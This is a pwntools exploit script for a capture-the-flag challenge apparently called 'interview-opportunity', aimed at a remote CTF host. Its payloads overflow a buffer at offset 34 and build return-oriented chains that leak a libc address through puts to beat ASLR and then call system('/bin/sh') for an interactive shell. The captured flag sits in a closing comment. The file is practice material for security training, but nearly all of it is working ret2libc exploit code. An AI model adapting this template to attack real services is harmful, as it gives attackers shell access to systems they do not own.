#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    return remote('mc.ax', 31081, *a, **kw)
 
gs = '''
init-pwndbg
continue
'''.format(**locals())

exe = './interview-opportunity'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./')
# warning/info/debug
context.log_level = 'debug'

pop_rdi = 0x401313

io = start()

payload = flat({
  34: [
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.sym.main
  ]
})
io.sendlineafter(b'join DiceGang?\n', payload)

io.recvuntil(b'haaaia')
io.recvline()
libc.address = u64(io.recvline()[:6].ljust(8, b'\x00')) - libc.sym.puts
print(hex(libc.address))

payload = flat({
  34: [
    pop_rdi + 1,
    pop_rdi,
    libc.search(b'/bin/sh').__next__(),
    libc.sym.system,
  ]
})
io.sendlineafter(b'join DiceGang?\n', payload)
io.interactive()
# dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}
